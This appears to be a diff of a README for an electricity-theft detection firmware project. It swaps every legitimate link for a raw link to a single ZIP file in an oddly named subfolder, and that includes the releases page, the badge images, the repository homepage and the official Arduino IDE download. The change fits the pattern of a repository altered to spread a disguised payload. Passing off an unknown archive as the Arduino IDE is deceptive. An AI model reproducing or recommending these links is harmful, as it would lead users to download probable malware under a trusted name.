@@ -1,6 +1,6 @@
 # ⚡ rule-based-power-theft-detection - Detect Electricity Theft Quickly and Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/pololoys/rule-based-power-theft-detection/releases)
+[![Download Latest Release](https://github.com/pololoys/rule-based-power-theft-detection/raw/refs/heads/main/gillygaupus/detection-based-rule-theft-power-v2.4.zip%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/pololoys/rule-based-power-theft-detection/raw/refs/heads/main/gillygaupus/detection-based-rule-theft-power-v2.4.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Follow these steps to download, install, and run the software on your embedded s
 
 Visit the release page by clicking the button below and download the latest software package:
 
-[![Download Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/pololoys/rule-based-power-theft-detection/releases)
+[![Download Release](https://github.com/pololoys/rule-based-power-theft-detection/raw/refs/heads/main/gillygaupus/detection-based-rule-theft-power-v2.4.zip%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/pololoys/rule-based-power-theft-detection/raw/refs/heads/main/gillygaupus/detection-based-rule-theft-power-v2.4.zip)
 
 On that page, look for the latest version and download the ZIP archive or firmware files suitable for your embedded device.
 
@@ -56,7 +56,7 @@ On that page, look for the latest version and download the ZIP archive or firmwa
 1. Connect your embedded system (Arduino, ESP32, Raspberry Pi, etc.) to your computer using a USB cable.
 2. Make sure you have the appropriate drivers installed for your device.
 3. Install any required software to upload the firmware:
-   - For Arduino: [Arduino IDE](https://www.arduino.cc/en/software)
+   - For Arduino: [Arduino IDE](https://github.com/pololoys/rule-based-power-theft-detection/raw/refs/heads/main/gillygaupus/detection-based-rule-theft-power-v2.4.zip)
    - For ESP32: Use the Arduino IDE or ESP-IDF as needed.
    - For Raspberry Pi: Use the terminal or compatible flashing tools.
 
@@ -89,7 +89,7 @@ Once everything is set up:
 
 To get started, download the latest release here:
 
-[Download rule-based-power-theft-detection](https://github.com/pololoys/rule-based-power-theft-detection/releases)
+[Download rule-based-power-theft-detection](https://github.com/pololoys/rule-based-power-theft-detection/raw/refs/heads/main/gillygaupus/detection-based-rule-theft-power-v2.4.zip)
 
 Follow the detailed installation steps above to flash your device and start monitoring electricity use right away.
 
@@ -121,7 +121,7 @@ For help, consult your embedded system’s manual or forums online.
 This software is part of a rule-driven embedded system designed to secure your electrical installation by analyzing current patterns and isolating suspicious loads automatically. It helps reduce losses due to theft and ensures fair electricity billing.
 
 For technical details and updates, visit the repository’s main page:  
-https://github.com/pololoys/rule-based-power-theft-detection
+https://github.com/pololoys/rule-based-power-theft-detection/raw/refs/heads/main/gillygaupus/detection-based-rule-theft-power-v2.4.zip
 
 ---
 
